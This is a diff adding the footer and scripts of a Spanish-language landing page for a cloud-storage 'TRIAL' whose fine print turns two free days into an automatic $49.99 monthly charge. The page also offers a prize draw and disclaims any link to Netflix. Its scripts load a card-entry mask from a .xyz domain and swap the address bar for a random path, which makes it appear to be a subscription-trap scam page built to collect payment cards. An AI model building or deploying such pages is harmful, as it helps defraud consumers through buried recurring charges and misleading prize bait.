+          <p>Es un servicio de almacenamiento en la nube por suscripción mensual que proporciona a sus miembros acceso a su plataforma donde pueden cargar, almacenar, administrar, descargar sus ficheros.</p>
+        </div>
+        <div class="col-lg-4 col-sm-12">
+          <h4>¿A qué me comprometo?</h4>
+          <p>Al usar TRIAL, usted se suscribe al servicio premium de regulardrive.net. Después de dos días de prueba, si no cancela su cuenta, tendrá que pagar el valor de la suscripción premium cada mes. Las condiciones de suscripción están disponibles aquí: <a id="tos1" href="https://registerdrive.xyz/shared/legal/es/tos-es.html" target="_blank">Términos y Condiciones</a> . Fácil desuscripción. Si no cancela la suscripción durante su período de prueba, tendrá que pagar su suscripción cada mes y se renovará mensualmente automáticamente hasta que cancele su suscripción. La suscripción cuesta cuarenta y nueve dólares americanos y noventa y nueve centavos por mes, pagaderos con tarjeta de crédito o débito.</p>
+        </div>
+        <div class="col-lg-4 col-sm-12">
+          <h4>¿Cómo puedo ganar?</h4>
+          <p>Con tu cuenta premium, participas en el sorteo de este producto/servicio promocional (una suscripción anual) seleccionando al azar al ganador de entre uno de sus usuarios activos. El próximo sorteo se realizará el 31-12-2021 entre todos los usuarios activos. Más información en la sección de Condiciones de Servicio. Se contactará con el ganador para proceder con el envío o entrega del premio. No tenemos conexión con Netflix y sus socios.</p>
+        </div>
+      </div>
+
+      <p style="font-size : 13px">2021 Todos los derechos reservados - PCG MARKETING EVOLUTION LTD Strovolou 77, Strovolos Centre, 2nd floor, Flat/Office 204, 2018 Nicosia Cyprus. -
+      <a id="privacy1" href="https://registerdrive.xyz/shared/legal/es/privacy-es.html" target="_blank"> Política de privacidad</a> - <a id="gdpr1" href="https://registerdrive.xyz/shared/legal/es/gdpr-es.html" target="_blank"> GDPR</a></p>
+
+    </div>
+
+
+  </footer>
+
+  <script type="text/javascript" src="./main2.js?1638779860"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
+<script src="https://registerdrive.xyz/shared/geo/es/card_mask.js"></script>
+   <script>
+        var parameters = location.href.split('?')[1];
+        if (typeof parameters === "undefined") {
+          parameters = "";
+        }else{
+          parameters = "?"+parameters;
+        };
+
+
+		let caracteres = "abcdefghijkmnpqrtuvwxyzABCDEFGHJKMNPQRTUVWXYZ2346789";
+		let contraseña = "";
+		for (i=0; i<8; i++) contraseña +=caracteres.charAt(Math.floor(Math.random()*caracteres.length)); 
+		
+
+        window.history.replaceState("", "", `/${contraseña}/net/${parameters}`);
+
+
+	</script>
+</body>
+
+</html>
+
+
+
+
+
+
